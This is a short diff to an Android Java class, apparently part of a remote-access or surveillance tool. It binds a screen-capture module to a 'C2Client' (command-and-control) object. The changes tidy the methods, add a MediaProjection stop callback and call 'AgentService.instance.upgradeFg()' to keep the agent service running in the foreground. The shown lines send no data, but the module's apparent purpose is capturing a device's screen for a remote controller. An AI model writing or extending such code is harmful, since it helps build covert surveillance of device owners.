@@ -33,7 +33,9 @@ public class ScreenModule {
     private final Handler ui = new Handler(Looper.getMainLooper());
     private C2Client client;
 
-    public void bind(C2Client c) { this.client = c; }
+    public void bind(C2Client c) {
+        this.client = c;
+    }
 
     public void request(Activity act) {
         MediaProjectionManager mpm = (MediaProjectionManager)
@@ -41,15 +43,28 @@ public class ScreenModule {
         if (mpm != null) act.startActivityForResult(mpm.createScreenCaptureIntent(), REQ_PROJECTION);
     }
 
-    public boolean ready() { return projection != null && reader != null; }
+    public boolean ready() {
+        return projection != null && reader != null;
+    }
 
     public void start(Context ctx, Intent data, int resultCode) {
+        if (data == null) return;
         MediaProjectionManager mpm = (MediaProjectionManager)
                 ctx.getSystemService(Context.MEDIA_PROJECTION_SERVICE);
-        if (mpm == null || data == null) return;
+        if (mpm == null) return;
+
         stop();
         projection = mpm.getMediaProjection(resultCode, data);
         if (projection == null) return;
+
+        projection.registerCallback(new MediaProjection.Callback() {
+            @Override
+            public void onStop() {
+                stop();
+            }
+        }, ui);
+
+        if (AgentService.instance != null) AgentService.instance.upgradeFg();
 
         DisplayMetrics dm = new DisplayMetrics();
         WindowManager wm = (WindowManager) ctx.getSystemService(Context.WINDOW_SERVICE);
